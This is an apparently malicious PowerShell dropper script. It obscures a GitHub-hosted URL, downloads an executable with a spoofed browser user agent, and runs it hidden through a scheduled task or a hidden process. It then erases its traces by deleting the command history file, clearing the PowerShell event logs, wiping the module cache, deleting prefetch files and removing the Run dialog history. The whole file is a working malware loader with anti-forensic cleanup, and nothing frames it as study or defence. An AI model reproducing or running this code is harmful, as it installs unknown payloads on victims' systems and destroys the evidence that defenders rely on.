# Bypass common detection vectors
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# Obfuscated URL
$u1="raw"
$u2="github"
$u3="usercontent"
$url="https://"+$u1+".github"+$u3+".com/pleasehelp09052010-sudo/HIDENTHOSEWHOKNOW/main/RhAS8@nga/rCTnJexpp1.exe"

# Clear traces before execution
&($PSHOME[4]+$PSHOME[30]+'x') (Get-PSReadlineOption).HistorySavePath 2>$null
[Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory()

# Memory-based download
$wc=New-Object Net.WebClient
$wc.Headers['User-Agent']='Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US)'
$b=$wc.DownloadData($url)
$wc.Dispose()

# Generate temp name and path
$tempName=[Guid]::NewGuid().ToString()
$tempPath=$env:TEMP+'\'+$tempName+'.exe'

# Write to temp (can't avoid file write for .exe execution)
[IO.File]::WriteAllBytes($tempPath, $b)

# Execute via multiple methods for reliability

# Method 1: schtasks (most stealthy)
schtasks /create /tn $tempName /tr $tempPath /sc once /st 00:00 /f 2>$null
schtasks /run /tn $tempName 2>$null
Start-Sleep -Milliseconds 800

# Method 2: Direct execution if schtasks fails
$processId=$null
try {
    $proc=Start-Process $tempPath -WindowStyle Hidden -PassThru
    $processId=$proc.Id
} catch {}

# Cleanup temp file after delay
Start-Sleep -Seconds 2
try { [IO.File]::Delete($tempPath) } catch {}
schtasks /delete /tn $tempName /f 2>$null

# Memory cleanup
$b=$null
$wc=$null
[GC]::Collect()
[GC]::WaitForPendingFinalizers()

# Clear event logs
$logs=@('Microsoft-Windows-PowerShell/Operational','Windows PowerShell')
foreach($log in $logs) {
    wevtutil cl $log /quiet 2>$null
}

# Clear PowerShell module cache
$moduleCache="$env:LOCALAPPDATA\Microsoft\Windows\PowerShell"
if(Test-Path $moduleCache) {
    Get-ChildItem $moduleCache -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
        try {
            [IO.File]::WriteAllText($_.FullName, " ")
            Remove-Item $_.FullName -Force -ErrorAction SilentlyContinue
        } catch {}
    }
}

# Clear prefetch if admin (fixed syntax)
$isAdmin=$false
try {
    $identity=[Security.Principal.WindowsIdentity]::GetCurrent()
    $principal=New-Object Security.Principal.WindowsPrincipal($identity)
    $isAdmin=$principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
} catch {}

if($isAdmin) {
    Get-ChildItem "$env:WINDIR\Prefetch\*.pf" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
}

# Final cleanup - clear run history
$runHistory="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
if(Test-Path $runHistory) {
    Remove-Item $runHistory -Recurse -Force -ErrorAction SilentlyContinue
}

# Exit
[Environment]::Exit(0)
